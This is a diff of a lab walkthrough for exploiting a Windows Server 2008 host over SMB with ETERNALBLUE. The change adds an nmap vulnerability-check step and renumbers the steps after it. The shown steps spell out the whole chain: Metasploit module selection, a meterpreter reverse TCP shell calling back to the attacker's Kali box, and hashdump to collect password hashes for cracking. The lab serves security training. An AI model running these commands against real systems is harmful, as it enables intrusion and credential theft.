@@ -32,49 +32,57 @@ nmap -T4 -sSVC <IP address of your Windows server> -p 80,443,445
 
    This should return information about the SMB service on 445, so now we've determined that SMB may be a good attack point.  
 
-3. There are other discovery methods we can do to determine what vulnerabilities may be available on this host via SMB, but for the purposes of this exercise, we'll skip ahead to where we've determined that this host is susceptible to the ETERNALBLUE vulnerability, which we will now attack. On Terminal 1, start the metasploit console, which we will use to execute the attack.
+3. We can see from the output that nmap was able to determine from the SMB information that the operating system is Windows Server 2008. We know that this OS, if unpatched, can be vulnerable to the ETERNALBLUE exploit. We'll now run an nmap script to determine if this server is unpatched and vulnerable.
+
+```bash
+nmap -p 445 <IP of Windows host> --script smb-vuln-ms17-010
+```
+
+   * This tells nmap to scan your host on port 445 using the script that determines if it is vulnerable to ETERNALBLUE. It should come back indicating that it is indeed vulnerable.
+
+4. Now that we know the host is vulnerable to ETERNALBLUE, we can run an exploit on it. On Terminal 1, start the metasploit console, which we will use to execute the attack.
 
 ```bash
 msfconsole
 ```
 
-4. Once you are at the msfconsole command prompt, select the metasploit module for eternal blue (msfconsole supports tab-complete).
+5. Once you are at the msfconsole command prompt, select the metasploit module for eternal blue (msfconsole supports tab-complete).
 
 ```bash
 use exploit/windows/smb/ms17_010_eternalblue
 ```
 
-5. Review your options for this module.
+6. Review your options for this module.
 
 ```bash
 show options
 ```
 
-6. Notice that the RHOST option is requied. This is the IP address of the host to be attacked.
+7. Notice that the RHOST option is requied. This is the IP address of the host to be attacked.
 
 ```bash
 set RHOST <IP address of your Windows server>
 ```
 
-7. Now we need to set the payload. You can use many kinds of payloads to gain shell access, but in this scenario we'll deploy a meterpreter reverse tcp shell that connects back to our local box. Meterpreter shell allows us to execute a variety of useful functions once we gain access to the target box.
+8. Now we need to set the payload. You can use many kinds of payloads to gain shell access, but in this scenario we'll deploy a meterpreter reverse tcp shell that connects back to our local box. Meterpreter shell allows us to execute a variety of useful functions once we gain access to the target box.
 
 ```bash
 set payload payload/windows/meterpreter/reverse_tcp
 ```
 
-8. Now show options again, and notice that the LHOST option is now available and required. This needs to be set to the IP of your local box so the shell knows where to connect back to once it's running on the target host.
+9. Now show options again, and notice that the LHOST option is now available and required. This needs to be set to the IP of your local box so the shell knows where to connect back to once it's running on the target host.
 
 ```bash
 set LHOST <IP of your Kali box>
 ```
 
-9. Run the exploit. If it goes well, you should see a WIN! message and have a new meterpreter shell prompt.
+10. Run the exploit. If it goes well, you should see a WIN! message and have a new meterpreter shell prompt.
 
 ```bash
 run
 ```
 
-10. You should now have a meterpreter shell prompt on the target host. You can run `help` at any time to see the commands availalbe to you here. First we'll want to launch a cmd prompt and run some commands to verify you have system access to the correct host.
+11. You should now have a meterpreter shell prompt on the target host. You can run `help` at any time to see the commands availalbe to you here. First we'll want to launch a cmd prompt and run some commands to verify you have system access to the correct host.
 
 ```bash
 shell
@@ -83,23 +91,23 @@ hostname
 exit
 ```
 
-11. Back at the meterpreter shell, now we want to see if we can get a dump of the passwords and then try to crack them. To make this easier, we want to start a logging session so any dumped hashes are already saved for us in a text file. To do this, we need to run the `background` command to bring us back to the msfconsole prompt and start spooling. Run the following commands.
+12. Back at the meterpreter shell, now we want to see if we can get a dump of the passwords and then try to crack them. To make this easier, we want to start a logging session so any dumped hashes are already saved for us in a text file. To do this, we need to run the `background` command to bring us back to the msfconsole prompt and start spooling. Run the following commands.
 
 ```bash
 background
 spool /tmp/console.log
 ```
 
-12. This will start logging all of your commands and output to /tmp/console.log. Now we need to connect back to our meterpreter shell session. To view the list of sessions available, use the `sessions -l` command, followed by `sessions -i <id>` where `<id>` is the ID of the session listed from the output of the `sessions -l` command.
+13. This will start logging all of your commands and output to /tmp/console.log. Now we need to connect back to our meterpreter shell session. To view the list of sessions available, use the `sessions -l` command, followed by `sessions -i <id>` where `<id>` is the ID of the session listed from the output of the `sessions -l` command.
 
 ```bash
 sessions -l
 sessions -i <id>
 ```
 
-13. Back on the meterpreter shell, run `hashdump`. You should see a list of usernames and hashed passwords, which are automatically logged as output to /tmp/console.log. 
+14. Back on the meterpreter shell, run `hashdump`. You should see a list of usernames and hashed passwords, which are automatically logged as output to /tmp/console.log. 
 
-14. Background the session again, and turn off spooling so we don't keep outputting unnecessary logs to /tmp/console.log
+15. Background the session again, and turn off spooling so we don't keep outputting unnecessary logs to /tmp/console.log
 
 ```bash
 background
